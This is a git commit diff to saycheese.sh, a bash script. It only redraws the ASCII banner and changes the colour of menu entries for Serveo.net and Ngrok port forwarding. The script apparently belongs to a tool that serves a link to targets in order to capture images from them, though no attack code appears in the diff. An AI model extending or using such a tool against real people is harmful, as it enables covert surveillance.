d553997e4a2f1a5c813cac63b6ceff10d9bd2d65
Pravinkumar2523 <56043735+Pravinkumar2523@users.noreply.github.com>
2019-11-01 22:21:06 +0530

    say cheese

--- saycheese.sh
+++ saycheese.sh
@@ -8,12 +8,12 @@ trap 'printf "\n";stop' 2
 banner() {
 
 
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                                           \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___    ___   |  /      \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _   |   |  | /        \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/  |___|  | \       \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___|  |      |  \        \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
+printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                         \e [1;92m   ____   ||  //       \e[0m\n"
+printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___ \e [1;92m ||    || || //      \e[0m\n"
+printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \e [1;92m ||    || ||//          \e[0m\n"
+printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[1;92m ||____|| ||\\     \e[0m\n"
+printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[1;92m ||       || \\      \e[0m\n"
+printf "\e[1;92m              |___/ \e[0m                                            [1;92m||       ||  \\        [0m     \n"     
 
 printf " \e[1;77m v1.0 coded by Pravin kumar \e[0m \n"
 
@@ -184,8 +184,8 @@ rm -rf sendlink
 fi
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;50m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;50m Ngrok\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
